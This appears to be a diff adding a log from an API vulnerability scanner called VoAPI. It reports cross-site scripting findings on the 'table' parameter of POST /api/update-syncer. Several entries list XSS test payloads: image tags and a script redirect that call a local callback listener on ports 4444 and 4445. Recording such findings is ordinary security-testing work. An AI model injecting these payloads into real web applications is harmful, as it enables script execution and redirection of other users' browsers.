@@ -1,0 +1,39 @@
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /api/update-syncer
+Vul API Method: Post
+API Vul Param: table
+API Test Payload: <img src='http://127.0.0.1:4444/xss/api/update-syncerVoAPItable'>
+
+API Vul Type: xss
+Vul API Url: /api/update-syncer
+Vul API Method: Post
+API Vul Param: table
+API Test Payload: <img src='http://127.0.0.1:4444/xss/api/update-syncerVoAPItable'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /api/update-syncer
+Vul API Method: Post
+API Vul Param: table
+API Test Payload: <img src='https://127.0.0.1:4445/xss/api/update-syncerVoAPItable'>
+
+API Vul Type: xss
+Vul API Url: /api/update-syncer
+Vul API Method: Post
+API Vul Param: table
+API Test Payload: <img src='https://127.0.0.1:4445/xss/api/update-syncerVoAPItable'>
+
+-------- VoAPI Vul API --------
+API Vul Type: xss
+Vul API Url: /api/update-syncer
+Vul API Method: Post
+API Vul Param: table
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/api/update-syncerVoAPItable'</script>
+
+API Vul Type: xss
+Vul API Url: /api/update-syncer
+Vul API Method: Post
+API Vul Param: table
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/api/update-syncerVoAPItable'</script>
+
